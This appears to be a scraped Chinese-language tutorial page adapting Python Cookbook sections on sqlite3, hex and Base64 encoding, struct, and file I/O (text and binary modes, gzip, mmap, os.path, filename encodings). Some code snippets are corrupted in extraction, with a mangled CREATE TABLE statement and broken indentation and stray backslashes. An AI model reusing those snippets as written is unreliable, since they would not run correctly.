remove() 方法从它的直接父节点中删除。如果你插入或增加新的元素，你同样使\n用父节点元素的 insert() 和 append() 方法。还能对元素使用索引和切片操作，比如\nelement[i] 或 element[i:j] 利用命名空间解析 XML 文档 与关系型数据库的交互 在关系型数据库中查询、增加或删除记录 Python 中表示多行数据的标准方式是一个由元组构成的序列: stocks = [\n  ('GOOG', 100, 490.1),\n  ('AAPL', 50, 545.75),\n  ('FB', 150, 7.45),\n  ('HPQ', 75, 33.2),\n] 你可以使用 Python 标准库中的 sqlite3: >>> import sqlite3\n>>> db = sqlite3.connect('database.db')\n>>>\n\n>>> c = db.cursor()\n>>> c.execute('create table portfolio (symbol text, shares integer, price␣ , real)')\n<sqlite3.Cursor object at 0x10067a730>\n>>> db.commit()\n>>>\n\n>>> c.executemany('insert into portfolio values (?,?,?)', stocks)\n<sqlite3.Cursor object at 0x10067a730>\n>>> db.commit()\n>>>\n\n>>> for row in db.execute('select * from portfolio'):\n... print(row)\n...\n('GOOG', 100, 490.1)\n('AAPL', 50, 545.75)\n('FB', 150, 7.45)\n('HPQ', 75, 33.2)\n>>> 如果你想接受用户输入作为参数来执行查询操作，必须确保你使用下面这样的占\n位符 ‘‘?‘‘来进行引用参数: >>> min_price = 100\n>>> for row in db.execute('select * from portfolio where price >= ?', (min_price,)):\n...   print(row)\n...\n('GOOG', 100, 490.1)\n('AAPL', 50, 545.75)\n>>> 在比较低的级别上和数据库交互是非常简单的。你只需提供 SQL 语句并调用相应\n的模块就可以更新或提取数据了。 一个难点是数据库中的数据和 Python 类型直接的映射。对于日期类型，通常可以\n使用 datetime 模块中的 datetime 实例，或者可能是 time 模块中的系统时间戳。对\n于数字类型，特别是使用到小数的金融数据，可以用 decimal 模块中的 Decimal 实例\n来表示。不幸的是，对于不同的数据库而言具体映射规则是不一样的，你必须参考相应\n的文档。 另外一个更加复杂的问题就是 SQL 语句字符串的构造。你千万不要使用 Python\n字符串格式化操作符 (如%) 或者 .format() 方法来创建这样的字符串。如果传递给这\n些格式化操作符的值来自于用户的输入，那么你的程序就很有可能遭受 SQL 注入攻击\n(参考 http://xkcd.com/327 )。查询语句中的通配符 ? 指示后台数据库使用它自己的字\n符串替换机制，这样更加的安全。 不幸的是，不同的数据库后台对于通配符的使用是不一样的。\n大部分模块使用 ? 或 %s ，还有其他一些使用了不同的符号，比如:0 或:1 来指示参数。同样的，你还是得\n去参考你使用的数据库模块相应的文档。一个数据库模块的 paramstyle 属性包含了参\n数引用风格的信息。 对于简单的数据库数据的读写问题，使用数据库 API 通常非常简单。如果你要处\n理更加复杂的问题，建议你使用更加高级的接口，比如一个对象关系映射 ORM 所提供\n的接口。类似 SQLAlchemy 这样的库允许你使用 Python 类来表示一个数据库表，并且\n能在隐藏底层 SQL 的情况下实现各种数据库的操作。 编码和解码十六进制数 将一个十六进制字符串解码成一个字节字符串或者将一个字节字符串编码成\n一个十六进制字符串。 是简单的解码或编码一个十六进制的原始字符串，可以使用　 binascii\n模块。例如: >>> # Initial byte string\n>>> s = b'hello'\n>>> # Encode as hex\n>>> import binascii\n>>> h = binascii.b2a_hex(s)\n>>> h\nb'68656c6c6f'\n>>> # Decode back to bytes\n>>> binascii.a2b_hex(h)\nb'hello'\n>>> 类似的功能同样可以在 base64 模块中找到。例如: >>> import base64\n>>> h = base64.b16encode(s)\n>>> h\nb'68656C6C6F'\n>>> base64.b16decode(h)\nb'hello'\n>>> 大部分情况下，通过使用上述的函数来转换十六进制是很简单的。上面两种技术的\n主要不同在于大小写的处理。函数 base64.b16decode() 和 base64.b16encode() 只能\n操作大写形式的十六进制字母，而 binascii 模块中的函数大小写都能处理。 在解码十六进制数时，函数 b16decode() 和 a2b_hex() 可以接受字节或 unicode\n字符串。但是，unicode 字符串必须仅仅只包含 ASCII 编码的十六进制数。 编码解码 Base64 数据 使用 Base64 格式解码或编码二进制数据。 base64 模块中有两个函数 b64encode() and b64decode() 可以帮你解决这个问题。\n例如: >>> # Some byte data\n>>> s = b'hello'\n>>> import base64\n>>> # Encode as Base64\n>>> a = base64.b64encode(s)\n>>> a\nb'aGVsbG8='\n>>> # Decode from Base64\n>>> base64.b64decode(a)\nb'hello'\n>>> Base64 编码仅仅用于面向字节的数据比如字节字符串和字节数组。此外，编码处\n理的输出结果总是一个字节字符串。如果你想混合使用 Base64 编码的数据和 Unicode\n文本，你必须添加一个额外的解码步骤。例如: >>> a = base64.b64encode(s).decode('ascii')\n>>> a\n'aGVsbG8='\n>>> 读写二进制数组数据 想读写一个二进制数组的结构化数据到 Python 元组中。 可以使用 struct 模块处理二进制数据。下面是一段示例代码将一个 Python 元组\n列表写入一个二进制文件，并使用 struct 将每个元组编码为一个结构体: from struct import Struct\n\ndef write_records(records, format, f):\n  '''\n  Write a sequence of tuples to a binary file of structures.\n  '''\n  record_struct = Struct(format)\n  for r in records:\n    f.write(record_struct.pack(*r))\n\n# Example\nif __name__ == '__main__':\n  records = [ (1, 2.3, 4.5),\n              (6, 7.8, 9.0),\n              (12, 13.4, 56.7) ]\n  with open('data.b', 'wb') as f:\n  write_records(records, '<idd', f) 读取嵌套和可变长二进制数据 需要读取包含嵌套或者可变长记录集合的复杂二进制格式的数据。这些数据可\n能包含图片、视频、电子地图文件等。 struct 模块可被用来编码/解码几乎所有类型的二进制的数据结构。为了解释清\n楚这种数据，假设你用下面的 Python 数据结构来表示一个组成一系列多边形的点的集\n合: polys = [\n  [ (1.0, 2.5), (3.5, 4.0), (2.5, 1.5) ],\n  [ (7.0, 1.2), (5.1, 3.0), (0.5, 7.5), (0.8, 9.0) ],\n  [ (3.4, 6.3), (1.2, 0.5), (4.6, 9.2) ],\n] ... 数据的累加与统计操作 需要处理一个很大的数据集并需要计算数据总和或其他统计量。 对于任何涉及到统计、时间序列以及其他相关技术的数据分析问题，都可以考虑使\n用 Pandas 库: pandas","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Data-encoding-and-processing.html","loc":"/yq-docs-rear-end-python-cookbook-Data-encoding-and-processing.html"},{"title":"文件/IO","text":"所有程序都要处理输入和输出。这一章将涵盖处理不同类型的文件，包括文本和二\n进制文件，文件编码和其他相关的内容。对文件名和目录的操作也会涉及到。 读写文本数据 读写各种不同编码的文本数据，比如 ASCII，UTF-8 或 UTF-16 编码 使用带有 rt 模式的 open() 函数读取文本文件: # Read the entire file as a single string\nwith open('somefile.txt', 'rt') as f:\n  data = f.read()\n\n# Iterate over the lines of the file\nwith open('somefile.txt', 'rt') as f:\n  for line in f:\n    # process line\n    ... 文件的读写操作默认使用系统编码，可以通过调用 sys.getdefaultencoding() 来 得到。在大多数机器上面都是 utf-8 编码。\n如果你已经知道你要读写的文本是其他编码 方式，那么可以通过传递一个可选的 encoding 参数给 open() 函数: with open('somefile.txt', 'rt', encoding='latin-1') as f:\n  ... Python 支持非常多的文本编码。\n几个常见的编码是 ascii, latin-1, utf-8 和 utf-16。\n在 web 应用程序中通常都使用的是 UTF-8。ascii 对应从 U+0000 到 U+007F 范围内 的 7 位字符。\nlatin-1 是字节 0-255 到 U+0000 至 U+00FF 范围内 Unicode 字符的直 接映射。 当读取一个未知编码的文本时使用 latin-1 编码永远不会产生解码错误。\n使用 latin-1 编码读取一个文件的时候也许不能产生完全正确的文本解码数据，但是它也能 从中提取出足够多的有用数据。\n同时，如果你之后将数据回写回去，原先的数据还是会 保留的。 读写文本文件一般来讲是比较简单的。\n但是也几点是需要注意的。\n首先，在例子 程序中的 with 语句给被使用到的文件创建了一个上下文环境，但 with 控制块结束时， 文件会自动关闭。\n你也可以不使用 with 语句，但是这时候你就必须记得手动关闭文件: f = open('somefile.txt', 'rt')\ndata = f.read()\nf.close() 另外一个问题是关于换行符的识别问题，在 Unix 和 Windows 中是不一样的 (分别 是 n 和 rn )。\n默认情况下，Python 会以统一模式处理换行符。\n这种模式下，在读 取文本的时候，Python 可以识别所有的普通换行符并将其转换为单个 n 字符。\n类似 的，在输出时会将换行符 n 转换为系统默认的换行符。\n如果你不希望这种默认的处理 方式，可以给 open() 函数传入参数 newline='' # Read with disabled newline translation\nwith open('somefile.txt', 'rt', newline='') as f:\n  ... 为了说明两者之间的差异，下面我在 Unix 机器上面读取一个 Windows 上面的文 本文件，里面的内容是 hello world!rn >>> # Newline translation enabled (the default)\n>>> f = open('hello.txt', 'rt')\n>>> f.read()\n'hello world!\\n'\n>>> # Newline translation disabled\n>>> g = open('hello.txt', 'rt', newline='')\n>>> g.read()\n'hello world!\\r\\n'\n>>> 文本文件中可能出现的编码错误。但你读取或者写入一个文本 文件时，你可能会遇到一个编码或者解码错误. 表示你读取文本时指定的编码不正确。你最好仔细阅读说 明并确认你的文件编码是正确的 (比如使用 UTF-8 而不是 Latin-1 编码或其他)。\n如果 编码错误还是存在的话，你可以给 open() 函数传递一个可选的 errors 参数来处理这 些错误。下面是一些处理常见错误的方法: >>> # Replace bad chars with Unicode U+fffd replacement char\n>>> f = open('sample.txt', 'rt', encoding='ascii', errors='replace')\n>>> f.read()\n'Spicy Jalape?o!'\n>>> # Ignore bad chars entirely\n>>> g = open('sample.txt', 'rt', encoding='ascii', errors='ignore')\n>>> g.read()\n'Spicy Jalapeo!'\n>>> 如果你经常使用 errors 参数来处理编码错误，可能会让你的生活变得很糟糕。\n对 于文本处理的首要原则是确保你总是使用的是正确编码。\n当模棱两可的时候，就使用默 认的设置 (通常都是 UTF-8) 打印输出至文件中 将 print() 函数的输出重定向到一个文件中去. 在 print() 函数中指定 file 关键字参数: with open('d:/work/test.txt', 'wt') as f:\n  print('Hello World!', file=f) 文件必须是以文本 模式打开。如果文件是二进制模式的话，打印就会出错。 使用其他分隔符或行终止符打印 使用 print() 函数输出数据，但是想改变默认的分隔符或者行尾符 可以使用在 print() 函数中使用 sep 和 end 关键字参数，以你想要的方式输出。 比如: >>> print('ACME', 50, 91.5)\nACME 50 91.5\n>>> print('ACME', 50, 91.5, sep=',')\nACME,50,91.5\n>>> print('ACME', 50, 91.5, sep=',', end='!!\\n')\nACME,50,91.5!!\n>>> 读写字节数据 读写二进制文件，比如图片，声音文件等等。 使用模式为 rb 或 wb 的 open() 函数来读取或写入二进制数据 在读取二进制数据时，需要指明的是所有返回的数据都是字节字符串格式的，而不 是文本字符串。\n类似的，在写入的时候，必须保证参数是以字节形式对外暴露数据的对 象 (比如字节字符串，字节数组对象等)。 在读取二进制数据的时候，字节字符串和文本字符串的语义差异可能会导致一个 潜在的陷阱。\n特别需要注意的是，索引和迭代动作返回的是字节的值而不是字节字符 串。比如: >>> b = b'Hello World'\n>>> b[0]\n72\n>>> for c in b:\n...   print(c)\n...\n72\n101\n108\n108\n111\n...\n>>> 如果你想从二进制模式的文件中读取或写入文本数据，必须确保要进行解码和编 码操作。比如: with open('somefile.bin', 'rb') as f:\n  data = f.read(16)\n  text = data.decode('utf-8')\n\nwith open('somefile.bin', 'wb') as f:\n  text = 'Hello World'\n  f.write(text.encode('utf-8')) 二进制 I/O 还有一个鲜为人知的特性就是数组和 C 结构体类型能直接被写入，而 不需要中间转换为自己对象: import array\nnums = array.array('i', [1, 2, 3, 4])\nwith open('data.bin','wb') as f:\n    f.write(nums) 这个适用于任何实现了被称之为\"缓冲接口\"的对象，这种对象会直接暴露其底层 的内存缓冲区给能处理它的操作。\n二进制数据的写入就是这类操作之一。 很多对象还允许通过使用文件对象的 readinto() 方法直接读取二进制数据到其底 层的内存中去。比如: >>> import array\n>>> a = array.array('i', [0, 0, 0, 0, 0, 0, 0, 0])\n>>> with open('data.bin', 'rb') as f:\n...   f.readinto(a)\n...\n16\n>>> a\narray('i', [1, 2, 3, 4, 0, 0, 0, 0])\n>>> 但是使用这种技术的时候需要格外小心，因为它通常具有平台相关性，并且可能会 依赖字长和字节顺序 (高位优先和低位优先)。 文件不存在才能写入 想像一个文件中写入数据，但是前提必须是这个文件在文件系统上不存在。也就 是不允许覆盖已存在的文件内容。 可以在 open() 函数中使用 x 模式来代替 w 模式的方法来解决这个问题: >>> with open('somefile', 'wt') as f:\n...     f.write('Hello\\n')\n...\n>>> with open('somefile', 'xt') as f:\n...     f.write('Hello\\n')\n...\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nFileExistsError: [Errno 17] File exists: 'somefile'\n>>> 如果文件是二进制的，使用 xb 来代替 xt 相对于先测试这个文件是否存在, 使用 x 文件模式更加简单。\n要注意的是 x 模式是一个 Python3 对 open() 函数特有的扩展。\n在 Python 的旧版本或者是 Python 实现的底层 C 函数库中都是没有 这个模式的。 字符串的 I/O 操作 使用操作类文件对象的程序来操作文本或二进制字符串。 使用 io.StringIO() 和 io.BytesIO() 类来创建类文件对象操作字符串数据: >>> s = io.StringIO()\n>>> s.write('Hello World\\n')\n12\n>>> print('This is a test', file=s)\n15\n>>> # Get all of the data written so far\n>>> s.getvalue()\n'Hello World\\nThis is a test\\n'\n>>>\n>>> # Wrap a file interface around an existing string\n>>> s = io.StringIO('Hello\\nWorld\\n')\n>>> s.read(4)\n'Hell'\n>>> s.read() 'o\\nWorld\\n'\n>>> io.StringIO 只能用于文本。如果你要操作二进制数据，要使用 io.BytesIO 类来 代替: >>> s = io.BytesIO()\n>>> s.write(b'binary data')\n>>> s.getvalue()\nb'binary data'\n>>> 当你想模拟一个普通的文件的时候 StringIO 和 BytesIO 类是很有用的。\n比如，在 单元测试中，你可以使用 StringIO 来创建一个包含测试数据的类文件对象，这个对象 可以被传给某个参数为普通文件对象的函数。 需要注意的是，StringIO 和 BytesIO 实例并没有正确的整数类型的文件描述符。\n因此，它们不能在那些需要使用真实的系统级文件如文件，管道或者是套接字的程序中 使用。 读写压缩文件 想读写一个 gzip 或 bz2 格式的压缩文件。 gzip 和 bz2 模块可以很容易的处理这些文件。\n两个模块都为 open() 函数提供了 另外的实现来解决这个问题。比如，为了以文本形式读取压缩文件，可以这样做: # gzip compression\nimport gzip\nwith gzip.open('somefile.gz', 'rt') as f:\n    text = f.read()\n\n# bz2 compression\nimport bz2\nwith bz2.open('somefile.bz2', 'rt') as f:\n    text = f.read() 大部分情况下读写压缩数据都是很简单的。但是要注意的是选择一个正确的文件 模式是非常重要的。\n如果你不指定模式，那么默认的就是二进制模式，如果这时候程 序想要接受的是文本数据，那么就会出错。\ngzip.open() 和 bz2.open() 接受跟内置的 open() 函数一样的参数，包括 encoding，errors，newline 等等。 当写入压缩数据时，可以使用 compresslevel 这个可选的关键字参数来指定一个 压缩级别。比如: with gzip.open('somefile.gz', 'wt', compresslevel=5) as f:\nf.write(text) 默认的等级是 9，也是最高的压缩等级。等级越低性能越好，但是数据压缩程度也 越低。 最后一点，gzip.open() 和 bz2.open() 还有一个很少被知道的特性，它们可以作 用在一个已存在并以二进制模式打开的文件上。\n比如，下面代码是可行的: import gzip\nf = open('somefile.gz', 'rb')\nwith gzip.open(f, 'rt') as g:\n    text = g.read() 这样就允许 gzip 和 bz2 模块可以工作在许多类文件对象上，比如套接字，管道和 内存中文件等。 固定大小记录的文件迭代 在一个固定长度记录或者数据块的集合上迭代，而不是在一个文件中一行一 行的迭代。 使用 iter 和 functools.partial() 函数: from functools import partial\nRECORD_SIZE = 32\nwith open('somefile.data', 'rb') as f:\n  records = iter(partial(f.read, RECORD_SIZE), b'')\n  for r in records:\n    ... 这个例子中的 records 对象是一个可迭代对象，它会不断的产生固定大小的数据 块，直到文件末尾。\n要注意的是如果总记录大小不是块大小的整数倍的话，最后一个返 回元素的字节数会比期望值少。 在例子中，functools.partial 用来创建一个每次被调用时从文件中读取固定数\n目字节的可调用对象。标记值 b'' 就是当到达文件结尾时的返回值。\n最后再提一点，上面的例子中的文件时以二进制模式打开的。\n如果是读取固定大小 的记录，这通常是最普遍的情况。而\n对于文本文件，一行一行的读取 (默认的迭代行为) 更普遍点。 读取二进制数据到可变缓冲区中 直接读取二进制数据到一个可变缓冲区中，而不需要做任何的中间复制操作。\n或者你想原地修改数据并将它写回到一个文件中去。 为了读取数据到一个可变数组中，使用文件对象的 readinto() 方法: import os.path\ndef read_into_buffer(filename):\n  buf = bytearray(os.path.getsize(filename))\n  with open(filename, 'rb') as f:\\\n    f.readinto(buf)\n    return buf 例子: >>> # Write a sample file\n>>> with open('sample.bin', 'wb') as f: ... f.write(b'Hello World')\n...\n>>> buf = read_into_buffer('sample.bin') >>> buf\nbytearray(b'Hello World')\n>>> buf[0:5] = b'Hallo'\n>>> buf\nbytearray(b'Hallo World')\n>>> with open('newsample.bin', 'wb') as f: ... f.write(buf)\n...\n11\n>>> 文件对象的 readinto() 方法能被用来为预先分配内存的数组填充数据，甚至包括 由 array 模块或 numpy 库创建的数组。\n和普通 read() 方法不同的是，readinto() 填 充已存在的缓冲区而不是为新对象重新分配内存再返回它们。\n因此，你可以使用它来避 免大量的内存分配操作。比如，如果你读取一个由相同大小的记录组成的二进制文件 时，你可以像下面这样写: record_size = 32 # Size of each record (adjust value)\nbuf = bytearray(record_size)\nwith open('somefile', 'rb') as f:\n  while True:\n    n = f.readinto(buf)\n    if n < record_size:\n      break\n     # Use the contents of buf\n... 另外有一个有趣特性就是 memoryview ，它可以通过零复制的方式对已存在的缓冲 区执行切片操作，甚至还能修改它的内容。比如: >>> buf\nbytearray(b'Hello World')\n>>> m1 = memoryview(buf)\n>>> m2 = m1[-5:]\n>>> m2\n<memory at 0x100681390>\n>>> m2[:] = b'WORLD'\n>>> buf bytearray(b'Hello WORLD')\n>>> 使用 f.readinto() 时需要注意的是，你必须检查它的返回值，也就是实际读取的 字节数。\n如果字节数小于缓冲区大小，表明数据被截断或者被破坏了 (比如你期望每次读取 指定数量的字节)。\n最后，留心观察其他函数库和模块中和 into 相关的函数 (比如 recv_into() ， pack_into() 等)。\nPython 的很多其他部分已经能支持直接的 I/O 或数据访问操作，这 些操作可被用来填充或修改数组和缓冲区内容。 内存映射的二进制文件 你想内存映射一个二进制文件到一个可变字节数组中，目的可能是为了随机访问 它的内容或者是原地做些修改。 使用 mmap 模块来内存映射文件。下面是一个工具函数，向你演示了如何打开一个 文件并以一种便捷方式内存映射这个文件: import os\nimport mmap\n\ndef memory_map(filename, access=mmap.ACCESS_WRITE):\n  size = os.path.getsize(filename)\n  fd = os.open(filename, os.O_RDWR)\n  return mmap.mmap(fd, size, access=access) 为了使用这个函数，你需要有一个已创建并且内容不为空的文件。下面是一个例 子，教你怎样初始创建一个文件并将其内容扩充到指定大小: >>> size = 1000000\n>>> with open('data', 'wb') as f:\n...   f.seek(size-1)\n...   f.write(b'\\x00')\n...\n>>> 利用 memory_map() 函数类内存映射文件内容: >>> m = memory_map('data')\n>>> len(m)\n1000000\n>>> m[0:10]\nb'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n>>> m[0]\n0\n>>> # Reassign a slice\n>>> m[0:11] = b'Hello World'\n>>> m.close()\n>>> # Verify that changes were made\n>>> with open('data', 'rb') as f:\n...   print(f.read(11))\n...\nb'Hello World'\n>>> mmap() 返回的 mmap 对象同样也可以作为一个上下文管理器来使用，这时候底层 的文件会被自动关闭。比如: >>> with memory_map('data') as m:\n...   print(len(m))\n...   print(m[0:10])\n...\n1000000 b'Hello World' >>> m.closed True\n>>> 默认情况下，memeory_map() 函数打开的文件同时支持读和写操作。任何的修改 内容都会复制回原来的文件中。\n如果需要只读的访问模式，可以给参数 access 赋值为 mmap.ACCESS_READ 如果你想在本地修改数据，但是又不想将修改写回到原始文件中，可以使用 mmap.ACCESS_COPY mmap 使用可参考: mmap 为了随机访问文件的内容，使用 mmap 将文件映射到内存中是一个高效和优雅的方 法。\n例如，你无需打开一个文件并执行大量的 seek() ，read() ，write() 调用，只需 要简单的映射文件并使用切片操作访问数据即可。 一般来讲，mmap() 所暴露的内存看上去就是一个二进制数组对象。但是，你可以 使用一个内存视图来解析其中的数据。比如: >>> m = memory_map('data')\n>>> # Memoryview of unsigned integers\n>>> v = memoryview(m).cast('I')\n>>> v[0] = 7\n>>> m[0:4]\nb'\\x07\\x00\\x00\\x00'\n>>> m[0:4] = b'\\x07\\x01\\x00\\x00'\n>>> v[0]\n263\n>>> 需要强调的一点是，内存映射一个文件并不会导致整个文件被读取到内存中。\n也就 是说，文件并没有被复制到内存缓存或数组中。\n相反，操作系统仅仅为文件内容保留了 一段虚拟内存。\n当你访问文件的不同区域时，这些区域的内容才根据需要被读取并映射 到内存区域中。\n而那些从没被访问到的部分还是留在磁盘上。所有这些过程是透明的， 在幕后完成! 如果多个 Python 解释器内存映射同一个文件，得到的 mmap 对象能够被用来在解 释器直接交换数据。\n也就是说，所有解释器都能同时读写数据，并且其中一个解释器所做的修改会自动呈现在其他解释器中。\n很明显，这里需要考虑同步的问题。但是这种方 法有时候可以用来在管道或套接字间传递数据。 文件路径名的操作 使用路径名来获取文件名，目录名，绝对路径等等。 使用 os.path 模块中的函数来操作路径名: >>> import os\n>>> path = '/Users/beazley/Data/data.csv'\n>>> # Get the last component of the path\n>>> os.path.basename(path)\n'data.csv'\n>>> # Get the directory name\n>>> os.path.dirname(path)\n'/Users/beazley/Data'\n>>> # Join path components together\n>>> os.path.join('tmp', 'data', os.path.basename(path))\n'tmp/data/data.csv'\n>>> # Expand the user's home directory\n>>> path = '~/Data/data.csv'\n>>> os.path.expanduser(path)\n'/Users/beazley/Data/data.csv'\n>>> # Split the file extension\n>>> os.path.splitext(path)\n('~/Data/data', '.csv')\n>>>\n\n对于任何的文件名的操作，你都应该使用 os.path 模块，而不是使用标准字符串 操作来构造自己的代码。\n特别是为了可移植性考虑的时候更应如此，\n因为 os.path 模 块知道 Unix 和 Windows 系统之间的差异并且能够可靠地处理类似 Data/data.csv 和 Data\\data.csv 这样的文件名。\n其次，你真的不应该浪费时间去重复造轮子。通常最好 是直接使用已经为你准备好的功能。 测试文件是否存在 使用 os.path 模块: >>> import os\n>>> os.path.exists('/etc/passwd')\nTrue 测试这个文件时什么类型的。在下面这些测试中，如果测试的文件不 存在的时候，结果都会返回 False: >>> # Is a regular file\n>>> os.path.isfile('/etc/passwd')\nTrue\n>>> # Is a directory\n>>> os.path.isdir('/etc/passwd')\nFalse\n>>> # Is a symbolic link\n>>> os.path.islink('/usr/local/bin/python3')\nTrue\n>>> # Get the file linked to\n>>> os.path.realpath('/usr/local/bin/python3')\n'/usr/local/bin/python3.3' 如果你还想获取元数据 (比如文件大小或者是修改日期)，也可以使用 os.path 模 块来解决: >>> os.path.getsize('/etc/passwd')\n3669\n>>> os.path.getmtime('/etc/passwd')\n1272478234.0\n>>> import time\n>>> time.ctime(os.path.getmtime('/etc/passwd'))\n'Wed Apr 28 13:10:34 2010'\n>>> 使用 os.path 来进行文件测试是很简单的。\n在写这些脚本时，可能唯一需要注意 的就是你需要考虑文件权限的问题，特别是在获取元数据时候 获取文件夹中的文件列表 os.listdir(dir) 获取文件列表 对于文件名的匹配，你可能会考虑使用 glob 或 fnmatch 模块。比如: import glob\npyfiles = glob.glob('somedir/*.py')\n\nfrom fnmatch import fnmatch\npyfiles = [name for name in os.listdir('somedir') if fnmatch(name, '*.py')] 获取目录中的列表是很容易的，但是其返回结果只是目录中实体名列表而已。\n如 果你还想获取其他的元信息，比如文件大小，修改时间等等，你或许还需要使用到 os.path 模块中的函数或着 os.stat() 函数来收集数据 最后还有一点要注意的就是，有时候在处理文件名编码问题时候可能会出现一些 问题。\n通常来讲，函数 os.listdir() 返回的实体列表会根据系统默认的文件名编码来 解码。但是有时候也会碰到一些不能正常解码的文件名。 忽略文件名编码 你想使用原始文件名执行文件的 I/O 操作，也就是说文件名并没有经过系统默认 编码去解码或编码过。 默认情况下，所有的文件名都会根据 sys.getfilesystemencoding() 返回的文本 编码来编码或解码。比如: >>> sys.getfilesystemencoding()\n'utf-8'\n>>> 如果因为某种原因你想忽略这种编码，可以使用一个原始字节字符串来指定一个 文件名即可。比如: >>> # Wrte a file using a unicode filename\n>>> with open('jalape\\xf1o.txt', 'w') as f:\n...   f.write('Spicy!')\n...\n6\n>>> # Directory listing (decoded)\n>>> import os\n>>> os.listdir('.')\n['jalapeño.txt']\n\n>>> # Directory listing (raw)\n>>> os.listdir(b'.') # Note: byte string\n[b'jalapen\\xcc\\x83o.txt']\n\n>>> # Open file with raw filename\n>>> with open(b'jalapen\\xcc\\x83o.txt') as f:\n...   print(f.read())\n...\nSpicy!\n>>> 通常来讲，你不需要担心文件名的编码和解码，普通的文件名操作应该就没问题 了。\n但是，有些操作系统允许用户通过偶然或恶意方式去创建名字不符合默认编码的文 件。\n这些文件名可能会神秘地中断那些需要处理大量文件的 Python 程序。 读取目录并通过原始未解码方式处理文件名可以有效的避免这样的问题，尽管这 样会带来一定的编程难度。 打印不合法的文件名 你的程序获取了一个目录中的文件名列表，\n但是当它试着去打印文件名的时候 程序崩溃，\n出现了 UnicodeEncodeError 异常和一条奇怪的消息——surrogates not allowed 。 当打印未知的文件名时，使用下面的方法可以避免这样的错误: def bad_filename(filename):\n  return repr(filename)[1:-1]\ntry:\n  print(filename)\nexcept UnicodeEncodeError:\n  print(bad_filename(filename)) 这一小节讨论的是在编写必须处理文件系统的程序时一个不太常见但又很棘手的 问题。\n默认情况下，Python 假定所有文件名都已经根据 sys.getfilesystemencoding() 的值编码过了。\n但是，有一些文件系统并没有强制要求这样做，因此允许创建文件名没 有正确编码的文件。\n这种情况不太常见，但是总会有些用户冒险这样做或者是无意之 中这样做了\n( 可能是在一个有缺陷的代码中给 open() 函数传递了一个不合规范的文件 名)。 当执行类似 os.listdir() 这样的函数时，这些不合规范的文件名就会让 Python 陷入困境。\n一方面，它不能仅仅只是丢弃这些不合格的名字。\n而另一方面，它又不能将 这些文件名转换为正确的文本字符串。\nPython 对这个问题的解决方案是从文件名中获 取未解码的字节值\n比如 xhh 并将它映射成 Unicode 字符 udchh 表示的所谓的\"代理 编码\"。\n下面一个例子演示了当一个不合格目录列表中含有一个文件名为 bäd.txt(使用 Latin-1 而不是 UTF-8 编码) 时的样子: >>> import os\n>>> files = os.listdir('.')\n>>> files\n['spam.py', 'b\\udce4d.txt', 'foo.txt']\n>>> 如果你有代码需要操作文件名或者将文件名传递给 open() 这样的函数，一切都能 正常工作。\n只有当你想要输出文件名时才会碰到些麻烦 (比如打印输出到屏幕或日志文 件等)。\n特别的，当你想打印上面的文件名列表时，你的程序就会崩溃: >>> for name in files:\n...   print(name)\n...\nspam.py\nTraceback (most recent call last):\n  File \"<stdin>\", line 2, in <module>\nUnicodeEncodeError: 'utf-8' codec can't encode character '\\udce4' in\nposition 1: surrogates not allowed\n>>> 程序崩溃的原因就是字符 udce4 是一个非法的 Unicode 字符。\n它其实是一个被 称为代理字符对的双字符组合的后半部分。由于缺少了前半部分，因此它是个非法的 Unicode。\n所以，唯一能成功输出的方法就是当遇到不合法文件名时采取相应的补救措 施。比如可以将上述代码修改如下: >>> for name in files:\n...   try:\n...     print(name)\n...   except UnicodeEncodeError:\n...     print(bad_filename(name))\n...\nspam.py\nb\\udce4d.txt\nfoo.txt\n>>> 在 bad_filename() 函数中怎样处置取决于你自己。另外一个选择就是通过某种方 式重新编码，示例如下: def bad_filename(filename):\n  temp = filename.encode(sys.getfilesystemencoding(), errors='surrogateescape')\n  return temp.decode('latin-1') 注解 surrogateescape含义 这种是 Python 在绝大部分面向 OS 的 API 中所使用的错误处理器， 它能以一种优雅的方式处理由操作系统提供的数据的编码问题。\n在解码出错时会将出错字节存储到一个很少被使用到的 Unicode 编码范围内。 在编码时将那些隐藏值又还原回原先解码失败的字节序列。 它不仅对于 OS API 非常有用，也能很容易的处理其他情况下的编码错误。 此时的输出: spam.py\nbäd.txt\nfoo.txt 增加或改变已打开文件的编码 你想在不关闭一个已打开的文件前提下增加或改变它的 Unicode 编码。 如果你想给一个以二进制模式打开的文件添加 Unicode 编码/解码方式，可以使用 io.TextIOWrapper() 对象包装它。比如: import urllib.request\nimport io\nu = urllib.request.urlopen('http://www.python.org')\nf = io.TextIOWrapper(u, encoding='utf-8')\ntext = f.read() 如果你想修改一个已经打开的文本模式的文件的编码方式，可以先使用 detach() 方法移除掉已存在的文本编码层，并使用新的编码方式代替。\n下面是一个在 sys.stdout 上修改编码方式的例子: >>> import sys\n>>> sys.stdout.encoding\n'UTF-8'\n>>> sys.stdout = io.TextIOWrapper(sys.stdout.detach(), encoding='latin-1')\n>>> sys.stdout.encoding\n'latin-1'\n>>> 这样做可能会中断你的终端，这里仅仅是为了演示而已。 I/O 系统由一系列的层次构建而成。你可以试着运行下面这个操作一个文本文件的 例子来查看这种层次: >>> f = open('sample.txt','w')\n>>> f\n<_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'>\n>>> f.buffer\n<_io.BufferedWriter name='sample.txt'>\n>>> f.buffer.raw\n<_io.FileIO name='sample.txt' mode='wb'>\n>>> io.TextIOWrapper 是一个编码和解码 Unicode 的文本处理层 io. BufferedWriter 是一个处理二进制数据的带缓冲的 I/O 层， io.FileIO 是一个表示操 作系统底层文件描述符的原始文件 增加或改变文本编码会涉及增加或改变最上面的 io.TextIOWrapper 层。 一般来讲，像上面例子这样通过访问属性值来直接操作不同的层是很不安全的。\n例 如，如果你试着使用下面这样的技术改变编码看看会发生什么: >>> f\n<_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'>\n>>> f = io.TextIOWrapper(f.buffer, encoding='latin-1')\n>>> f\n<_io.TextIOWrapper name='sample.txt' encoding='latin-1'>\n>>> f.write('Hello')\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nValueError: I/O operation on closed file.\n>>> 结果出错了，因为 f 的原始值已经被破坏了并关闭了底层的文件。\ndetach() 方法会断开文件的最顶层并返回第二层，之后最顶层就没什么用了。例\n如: >>> f = open('sample.txt', 'w')\n>>> f\n<_io.TextIOWrapper name='sample.txt' mode='w' encoding='UTF-8'>\n>>> b = 